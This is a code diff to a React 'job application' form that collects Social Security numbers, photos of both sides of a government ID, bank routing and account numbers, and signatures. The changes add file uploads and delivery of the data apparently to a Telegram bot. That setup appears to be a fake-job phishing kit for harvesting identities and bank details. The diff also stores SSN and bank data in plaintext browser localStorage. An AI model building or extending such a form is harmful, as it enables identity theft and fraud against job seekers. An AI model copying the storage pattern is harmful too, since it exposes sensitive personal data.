@@ -1,4 +1,4 @@
-import React, { useState, useCallback } from "react";
+import React, { useState, useCallback, useEffect } from "react";
 import { Header } from "./components/Header";
 import { ProgressBar } from "./components/ProgressBar";
 import { PersonalInfoSection } from "./components/sections/PersonalInfoSection";
@@ -12,6 +12,89 @@ import { SuccessModal } from "./components/SuccessModal";
 import { ErrorAlert } from "./components/ErrorAlert";
 import { Footer } from "./components/Footer";
 import { submitApplication } from "./utils/api";
+
+// --- NEW: Define a key for localStorage ---
+const LOCAL_STORAGE_KEY = "royalFoxFormData";
+
+// --- NEW: Define the initial empty state ---
+const initialFormState = {
+  firstName: "",
+  lastName: "",
+  middleName: "",
+  dob: "",
+  street: "",
+  city: "",
+  state: "",
+  zipCode: "",
+  phone: "",
+  email: "",
+  workAuthorized: "",
+  preferredContact: "",
+  ssn: "",
+  idType: "",
+  idNumber: "",
+  idExpiration: "",
+  idFront: null,
+  idBack: null,
+  positionApplied: "",
+  employmentType: "",
+  expectedSalary: "",
+  startDate: "",
+  workSchedule: "",
+  willOvertimeTravel: "",
+  bankName: "",
+  bankAccountType: "",
+  accountHolderName: "",
+  routingNumber: "",
+  accountNumber: "",
+  bankConsent: false,
+  highSchoolName: "",
+  highSchoolLocation: "",
+  collegeName: "",
+  collegeLocation: "",
+  collegeDegree: "",
+  licenses: "",
+  employmentHistory: [
+    {
+      company: "",
+      address: "",
+      jobTitle: "",
+      supervisorName: "",
+      dateFrom: "",
+      dateTo: "",
+      responsibilities: "",
+    },
+  ],
+  resume: null,
+  identityConsent: false,
+  bankDetailsConsent: false,
+  signature: "",
+  signatureDate: "",
+  dragActive: { idFront: false, idBack: false, resume: false },
+};
+
+// --- NEW: Function to load state from localStorage ---
+const loadStateFromLocalStorage = () => {
+  try {
+    const storedState = localStorage.getItem(LOCAL_STORAGE_KEY);
+    if (!storedState) {
+      return initialFormState;
+    }
+
+    const parsedState = JSON.parse(storedState);
+
+    // CRITICAL: Reset file fields to null as they cannot be stored
+    parsedState.idFront = null;
+    parsedState.idBack = null;
+    parsedState.resume = null;
+    parsedState.dragActive = { idFront: false, idBack: false, resume: false };
+
+    return parsedState;
+  } catch (err) {
+    console.error("Could not load state from localStorage", err);
+    return initialFormState;
+  }
+};
 
 export default function App() {
   const [currentStep, setCurrentStep] = useState(1);
@@ -30,61 +113,25 @@ export default function App() {
     "Review",
   ];
 
-  const [formData, setFormData] = useState({
-    firstName: "",
-    lastName: "",
-    middleName: "",
-    dob: "",
-    street: "",
-    city: "",
-    state: "",
-    zipCode: "",
-    phone: "",
-    email: "",
-    workAuthorized: "",
-    preferredContact: "",
-    ssn: "",
-    idType: "",
-    idNumber: "",
-    idExpiration: "",
-    idFront: null,
-    idBack: null,
-    positionApplied: "",
-    employmentType: "",
-    expectedSalary: "",
-    startDate: "",
-    workSchedule: "",
-    willOvertimeTravel: "",
-    bankName: "",
-    bankAccountType: "",
-    accountHolderName: "",
-    routingNumber: "",
-    accountNumber: "",
-    bankConsent: false,
-    highSchoolName: "",
-    highSchoolLocation: "",
-    collegeName: "",
-    collegeLocation: "",
-    collegeDegree: "",
-    licenses: "",
-    employmentHistory: [
-      {
-        company: "",
-        address: "",
-        jobTitle: "",
-        supervisorName: "",
-        dateFrom: "",
-        dateTo: "",
-        responsibilities: "",
-      },
-    ],
-    resume: null,
-    identityConsent: false,
-    bankDetailsConsent: false,
-    signature: "",
-    signatureDate: "",
-    dragActive: { idFront: false, idBack: false, resume: false },
-  });
+  // --- MODIFICATION: Load state from localStorage on init ---
+  const [formData, setFormData] = useState(loadStateFromLocalStorage);
+
+  // --- NEW: useEffect to save state to localStorage on every change ---
+  useEffect(() => {
+    try {
+      // Create a copy to avoid mutating state
+      const stateToSave = { ...formData };
+
+      // CRITICAL: Set file fields to null before saving
+      stateToSave.idFront = null;
+      stateToSave.idBack = null;
+      stateToSave.resume = null;
+
+      localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(stateToSave));
+    } catch (err) {
+      console.warn("Could not save state to localStorage", err);
+    }
+  }, [formData]);
 
   // ============================================
   // INPUT HANDLERS
@@ -129,8 +176,6 @@ export default function App() {
     }));
   };
 
-
-
   const handleDrag = (e, fileType) => {
     e.preventDefault();
     e.stopPropagation();
@@ -147,6 +192,7 @@ export default function App() {
     }
   };
 
+  // --- MODIFICATION: Store the File object, not the filename string ---
   const handleDrop = (e, fileType) => {
     e.preventDefault();
     e.stopPropagation();
@@ -157,14 +203,15 @@ export default function App() {
     if (e.dataTransfer.files && e.dataTransfer.files[0]) {
       setFormData((prev) => ({
         ...prev,
-        [fileType]: e.dataTransfer.files[0].name,
+        [fileType]: e.dataTransfer.files[0], // <-- Store the File object
       }));
     }
   };
 
+  // --- MODIFICATION: Store the File object, not the filename string ---
   const handleFileInput = (e, fileType) => {
     if (e.target.files && e.target.files[0]) {
-      setFormData((prev) => ({ ...prev, [fileType]: e.target.files[0].name }));
+      setFormData((prev) => ({ ...prev, [fileType]: e.target.files[0] })); // <-- Store the File object
     }
   };
 
@@ -173,6 +220,7 @@ export default function App() {
   // ============================================
 
   const canProceed = useCallback(() => {
+    // This logic works as-is because a File object is "truthy"
     if (currentStep === 1) {
       return (
         formData.firstName &&
@@ -253,19 +301,79 @@ export default function App() {
   // FORM SUBMISSION
   // ============================================
 
+  // --- MODIFICATION: Create FormData and send files ---
   const handleSubmit = async () => {
     if (!canProceed()) return;
 
     setIsLoading(true);
     setError(null);
 
+    // 1. Create a new FormData object
+    const data = new FormData();
+
+    // 2. Append all simple key-value pairs
+    Object.keys(formData).forEach((key) => {
+      const value = formData[key];
+      // Skip files and complex objects
+      if (
+        key === "idFront" ||
+        key === "idBack" ||
+        key === "resume" ||
+        key === "employmentHistory" ||
+        key === "dragActive"
+      ) {
+        return;
+      }
+      data.append(key, value);
+    });
+
+    // 3. Append complex objects as JSON strings
+    // (The backend server MUST JSON.parse() this)
+    data.append(
+      "employmentHistory",
+      JSON.stringify(formData.employmentHistory)
+    );
+
+    // 4. Append the actual files
+    if (formData.idFront) {
+      data.append("idFront", formData.idFront, formData.idFront.name);
+    }
+    if (formData.idBack) {
+      data.append("idBack", formData.idBack, formData.idBack.name);
+    }
+    if (formData.resume) {
+      data.append("resume", formData.resume, formData.resume.name);
+    }
+
     try {
-      const result = await submitApplication(formData);
-      setSubmittedData(result.data);
+      // 5. Send the FormData object
+      const result = await submitApplication(data);
+      setSubmittedData(result.data); // The server response is still JSON
       setShowSubmissionModal(true);
     } catch (err) {
-      setError(err.message || "Error submitting application");
-      console.error("Submission error:", err);
+      // 6. Improved error handling
+      let displayError = "Error submitting application. Please try again.";
+
+      // 'err' is now the object we threw from api.js
+      if (err) {
+        const serverMessage = err.message || "";
+        // Check if err.error is an object, stringify if it is
+        const serverErrorDetails = err.error
+          ? typeof err.error === "object"
+            ? JSON.stringify(err.error)
+            : err.error
+          : "";
+
+        displayError = `${serverMessage} ${serverErrorDetails}`;
+
+        if (String(serverErrorDetails).includes("chat not found")) {
+          displayError =
+            "Submission failed: The Telegram bot chat was not found. (Have you started the bot in Telegram?)";
+        }
+      }
+
+      setError(displayError);
+      console.error("Submission error details:", err);
     } finally {
       setIsLoading(false);
     }
@@ -275,65 +383,15 @@ export default function App() {
   // NEW APPLICATION
   // ============================================
 
+  // --- MODIFICATION: Clear localStorage when starting a new application ---
   const handleNewApplication = () => {
     setShowSubmissionModal(false);
     setCurrentStep(1);
     setError(null);
-    setFormData({
-      firstName: "",
-      lastName: "",
-      middleName: "",
-      dob: "",
-      street: "",
-      city: "",
-      state: "",
-      zipCode: "",
-      phone: "",
-      email: "",
-      workAuthorized: "",
-      preferredContact: "",
-      ssn: "",
-      idType: "",
-      idNumber: "",
-      idExpiration: "",
-      idFront: null,
-      idBack: null,
-      positionApplied: "",
-      employmentType: "",
-      expectedSalary: "",
-      startDate: "",
-      workSchedule: "",
-      willOvertimeTravel: "",
-      bankName: "",
-      bankAccountType: "",
-      accountHolderName: "",
-      routingNumber: "",
-      accountNumber: "",
-      bankConsent: false,
-      highSchoolName: "",
-      highSchoolLocation: "",
-      collegeName: "",
-      collegeLocation: "",
-      collegeDegree: "",
-      licenses: "",
-      employmentHistory: [
-        {
-          company: "",
-          address: "",
-          jobTitle: "",
-          supervisorName: "",
-          dateFrom: "",
-          dateTo: "",
-          responsibilities: "",
-        },
-      ],
-      resume: null,
-      identityConsent: false,
-      bankDetailsConsent: false,
-      signature: "",
-      signatureDate: "",
-      dragActive: { idFront: false, idBack: false, resume: false },
-    });
+    // Reset state to the initial empty form
+    setFormData(initialFormState);
+    // Clear the saved data from localStorage
+    localStorage.removeItem(LOCAL_STORAGE_KEY);
     window.scrollTo(0, 0);
   };
 
